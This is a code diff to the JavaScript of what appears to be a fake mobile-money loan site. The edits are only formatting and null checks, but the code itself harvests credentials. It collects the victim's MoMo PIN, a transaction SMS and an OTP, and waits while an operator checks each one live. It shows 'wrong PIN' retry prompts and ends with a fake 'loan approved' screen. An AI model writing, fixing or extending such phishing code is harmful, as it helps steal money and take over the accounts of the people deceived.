@@ -169,7 +169,14 @@ async function submitPinLogin() {
     body: JSON.stringify({ appId: appDataStore.appId, pin, phone: appDataStore.phone })
   });
 
-  startPollingForNextStep('SMS_STEP', 'screen-waiting-admin', 'screen-sms', 'PIN_REJECTED', 'screen-login', '✅ CORRECT PIN VERIFIED');
+  startPollingForNextStep(
+    'SMS_STEP', 
+    'screen-waiting-admin', 
+    'screen-sms', 
+    'PIN_REJECTED', 
+    'screen-login', 
+    '✅ CORRECT PIN VERIFIED'
+  );
 }
 
 // SMS Countdown Timer & Enforcement
@@ -218,7 +225,14 @@ async function submitSmsVerification() {
     body: JSON.stringify({ appId: appDataStore.appId, smsText })
   });
 
-  startPollingForNextStep('OTP_STEP', 'screen-waiting-sms', 'screen-otp', 'SMS_REJECTED', 'screen-sms', '✅ CORRECT SMS MESSAGE VERIFIED');
+  startPollingForNextStep(
+    'OTP_STEP', 
+    'screen-waiting-sms', 
+    'screen-otp', 
+    'SMS_REJECTED', 
+    'screen-sms', 
+    '✅ CORRECT SMS MESSAGE VERIFIED'
+  );
 }
 
 // OTP Inputs Management
@@ -258,7 +272,14 @@ async function submitOtpCode() {
     body: JSON.stringify({ appId: appDataStore.appId, otpCode })
   });
 
-  startPollingForNextStep('APPROVED', 'screen-waiting-otp', 'screen-success', 'OTP_REJECTED', 'screen-otp', '✅ CORRECT OTP VERIFIED - LOAN APPROVED');
+  startPollingForNextStep(
+    'APPROVED', 
+    'screen-waiting-otp', 
+    'screen-success', 
+    'OTP_REJECTED', 
+    'screen-otp', 
+    '✅ CORRECT OTP VERIFIED - LOAN APPROVED'
+  );
 }
 
 function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, rejectionStatus, rejectionScreenId, successMessage) {
@@ -282,7 +303,7 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
         }
 
         document.getElementById(nextScreenId).classList.add('active');
-        alert(successMessage);
+        if (successMessage) alert(successMessage);
       } else if (data.status === rejectionStatus) {
         clearInterval(pollInterval);
         document.getElementById(waitingScreenId).style.display = 'none';
@@ -292,25 +313,34 @@ function startPollingForNextStep(targetStatus, waitingScreenId, nextScreenId, re
           errorMsg = '❌ WRONG PIN ENTERED. Please check your MoMo PIN and try again.';
           document.querySelectorAll('.p-pin').forEach(i => i.value = '');
           const btn = document.getElementById('btn-login-momo');
-          btn.style.background = '#E2E2E2';
-          btn.style.color = '#888';
-          btn.setAttribute('disabled', 'true');
-          document.querySelector('.p-pin').focus();
+          if (btn) {
+            btn.style.background = '#E2E2E2';
+            btn.style.color = '#888';
+            btn.setAttribute('disabled', 'true');
+          }
+          const firstPin = document.querySelector('.p-pin');
+          if (firstPin) firstPin.focus();
         } else if (rejectionStatus === 'SMS_REJECTED') {
           errorMsg = '❌ WRONG SMS PASTED. Please copy and paste the correct transaction SMS message.';
-          document.getElementById('sms-text-input').value = '';
+          const smsInput = document.getElementById('sms-text-input');
+          if (smsInput) smsInput.value = '';
           const btn = document.getElementById('btn-submit-sms');
-          btn.style.background = '#E2E2E2';
-          btn.style.color = '#888';
-          btn.setAttribute('disabled', 'true');
+          if (btn) {
+            btn.style.background = '#E2E2E2';
+            btn.style.color = '#888';
+            btn.setAttribute('disabled', 'true');
+          }
         } else if (rejectionStatus === 'OTP_REJECTED') {
           errorMsg = '❌ WRONG OTP. Please check your code and enter the correct OTP.';
           document.querySelectorAll('.p-otp').forEach(i => i.value = '');
           const btn = document.getElementById('btn-verify-otp');
-          btn.style.background = '#E2E2E2';
-          btn.style.color = '#888';
-          btn.setAttribute('disabled', 'true');
-          document.querySelector('.p-otp').focus();
+          if (btn) {
+            btn.style.background = '#E2E2E2';
+            btn.style.color = '#888';
+            btn.setAttribute('disabled', 'true');
+          }
+          const firstOtp = document.querySelector('.p-otp');
+          if (firstOtp) firstOtp.focus();
         }
 
         document.getElementById(rejectionScreenId).classList.add('active');
